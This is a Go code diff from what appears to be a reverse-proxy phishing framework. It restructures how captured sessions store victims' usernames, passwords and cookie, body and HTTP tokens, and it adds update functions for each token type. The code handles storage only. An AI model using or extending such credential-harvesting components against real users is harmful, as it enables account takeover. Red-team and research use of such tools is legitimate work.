@@ -11,21 +11,23 @@ import (
 const SessionTable = "sessions"
 
 type Session struct {
-	Id         int                          `json:"id"`
-	Phishlet   string                       `json:"phishlet"`
-	LandingURL string                       `json:"landing_url"`
-	Username   string                       `json:"username"`
-	Password   string                       `json:"password"`
-	Custom     map[string]string            `json:"custom"`
-	Tokens     map[string]map[string]*Token `json:"tokens"`
-	SessionId  string                       `json:"session_id"`
-	UserAgent  string                       `json:"useragent"`
-	RemoteAddr string                       `json:"remote_addr"`
-	CreateTime int64                        `json:"create_time"`
-	UpdateTime int64                        `json:"update_time"`
+	Id           int                                `json:"id"`
+	Phishlet     string                             `json:"phishlet"`
+	LandingURL   string                             `json:"landing_url"`
+	Username     string                             `json:"username"`
+	Password     string                             `json:"password"`
+	Custom       map[string]string                  `json:"custom"`
+	BodyTokens   map[string]string                  `json:"body_tokens"`
+	HttpTokens   map[string]string                  `json:"http_tokens"`
+	CookieTokens map[string]map[string]*CookieToken `json:"tokens"`
+	SessionId    string                             `json:"session_id"`
+	UserAgent    string                             `json:"useragent"`
+	RemoteAddr   string                             `json:"remote_addr"`
+	CreateTime   int64                              `json:"create_time"`
+	UpdateTime   int64                              `json:"update_time"`
 }
 
-type Token struct {
+type CookieToken struct {
 	Name     string
 	Value    string
 	Path     string
@@ -46,18 +48,20 @@ func (d *Database) sessionsCreate(sid string, phishlet string, landing_url strin
 	id, _ := d.getNextId(SessionTable)
 
 	s := &Session{
-		Id:         id,
-		Phishlet:   phishlet,
-		LandingURL: landing_url,
-		Username:   "",
-		Password:   "",
-		Custom:     make(map[string]string),
-		Tokens:     make(map[string]map[string]*Token),
-		SessionId:  sid,
-		UserAgent:  useragent,
-		RemoteAddr: remote_addr,
-		CreateTime: time.Now().UTC().Unix(),
-		UpdateTime: time.Now().UTC().Unix(),
+		Id:           id,
+		Phishlet:     phishlet,
+		LandingURL:   landing_url,
+		Username:     "",
+		Password:     "",
+		Custom:       make(map[string]string),
+		BodyTokens:   make(map[string]string),
+		HttpTokens:   make(map[string]string),
+		CookieTokens: make(map[string]map[string]*CookieToken),
+		SessionId:    sid,
+		UserAgent:    useragent,
+		RemoteAddr:   remote_addr,
+		CreateTime:   time.Now().UTC().Unix(),
+		UpdateTime:   time.Now().UTC().Unix(),
 	}
 
 	jf, _ := json.Marshal(s)
@@ -126,12 +130,36 @@ func (d *Database) sessionsUpdateCustom(sid string, name string, value string) e
 	return err
 }
 
-func (d *Database) sessionsUpdateTokens(sid string, tokens map[string]map[string]*Token) error {
+func (d *Database) sessionsUpdateBodyTokens(sid string, tokens map[string]string) error {
 	s, err := d.sessionsGetBySid(sid)
 	if err != nil {
 		return err
 	}
-	s.Tokens = tokens
+	s.BodyTokens = tokens
+	s.UpdateTime = time.Now().UTC().Unix()
+
+	err = d.sessionsUpdate(s.Id, s)
+	return err
+}
+
+func (d *Database) sessionsUpdateHttpTokens(sid string, tokens map[string]string) error {
+	s, err := d.sessionsGetBySid(sid)
+	if err != nil {
+		return err
+	}
+	s.HttpTokens = tokens
+	s.UpdateTime = time.Now().UTC().Unix()
+
+	err = d.sessionsUpdate(s.Id, s)
+	return err
+}
+
+func (d *Database) sessionsUpdateCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
+	s, err := d.sessionsGetBySid(sid)
+	if err != nil {
+		return err
+	}
+	s.CookieTokens = tokens
 	s.UpdateTime = time.Now().UTC().Unix()
 
 	err = d.sessionsUpdate(s.Id, s)
